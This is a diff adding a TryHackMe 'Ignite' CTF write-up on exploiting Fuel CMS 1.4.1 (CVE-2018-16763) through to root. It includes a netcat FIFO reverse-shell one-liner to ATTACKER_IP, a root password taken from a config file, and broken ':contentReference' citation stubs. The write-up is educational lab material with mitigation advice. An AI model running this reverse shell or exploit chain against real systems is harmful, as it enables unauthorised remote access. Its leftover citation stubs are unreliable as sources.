@@ -1,0 +1,67 @@
+# TryHackMe – Ignite CTF
+
+**Objective:** Root the machine by exploiting a vulnerable CMS (Fuel CMS v1.4.1), capture both `user.txt` and `root.txt`.
+
+---
+
+## ​ Attack Flow Overview
+
+1. **Reconnaissance & Enumeration**  
+   - **Nmap scan** reveals only port 80 (HTTP) is open :contentReference[oaicite:1]{index=1}.  
+   - **robots.txt** discloses access to `/fuel/` (Fuel CMS login) :contentReference[oaicite:2]{index=2}.
+
+2. **CMS Discovery & Vulnerability Identification**  
+   - Web interface identifies Fuel CMS v1.4.x; this version is known to have an RCE vulnerability (CVE-2018-16763) :contentReference[oaicite:3]{index=3}.
+
+3. **Exploit Deployment & Initial Access**  
+   - Download Python exploit (e.g. `50477.py`) via `searchsploit` :contentReference[oaicite:4]{index=4}.  
+   - Execute exploit: obtain RCE, gain shell as `www-data`.
+
+4. **Reverse Shell**  
+   - Spawn a reverse shell using a named FIFO and netcat, e.g.,  
+     ```bash
+     rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
+     ```  
+     :contentReference[oaicite:5]{index=5}.
+
+5. **Flag Collection – `user.txt`**  
+   - Retrieve the user flag from `/home/www-data/user.txt` :contentReference[oaicite:6]{index=6}.
+
+6. **Privilege Escalation**  
+   - Inspect Fuel CMS config (`fuel/application/config/database.php`) to uncover root credentials (e.g., `mememe`) :contentReference[oaicite:7]{index=7}.  
+   - Use `su` or spawn a tty to escalate privileges.
+
+7. **Flag Collection – `root.txt`**  
+   - Read the root flag from `/root/root.txt` :contentReference[oaicite:8]{index=8}.
+
+---
+
+##  Lessons Learned
+
+- Always **enumerate default configurations**, as overlooked credentials (e.g., `admin:admin`) can unlock gateways prematurely :contentReference[oaicite:9]{index=9}.  
+- **Input sanitization failures** (e.g. filter parameter vulnerabilities) can lead to full RCE—keep input validation tight.  
+- Sensitive credentials stored in web application configs are a **frequent privilege escalation vector**. Secure config files accordingly.  
+- Embedding a **reverse shell payload** remains a reliable, if rudimentary, method—consider more stable alternatives for long-term access.
+
+---
+
+##  Defense & Mitigation Strategies
+
+- **Update Fuel CMS**: Patch to the latest version to fix CVE-2018-16763.  
+- **Harden PHP configurations**: Disable dangerous functions (`exec`, `system`, `eval`, etc.).  
+- **Enforce least privilege**: Run CMS with limited permissions; protect config files.  
+- **Web Application Firewall (WAF)**: Monitor and filter suspicious payloads.
+
+---
+
+##  Final Thoughts
+
+This machine elegantly demonstrates how even entry-level CTFs can teach profound lessons in web app security, exploitation chains, and privilege escalation. Onward—stay curious, stay ethical.
+
+---
+
+##  References
+
+- Exploiting Fuel CMS RCE (CVE-2018-16763) :contentReference[oaicite:10]{index=10}  
+- Walkthroughs by contributors like Vikram, Vedant Vartak, Mr0Wido :contentReference[oaicite:11]{index=11}  
+- System Weakness write-up covering enumeration and host file tweaks :contentReference[oaicite:12]{index=12}  
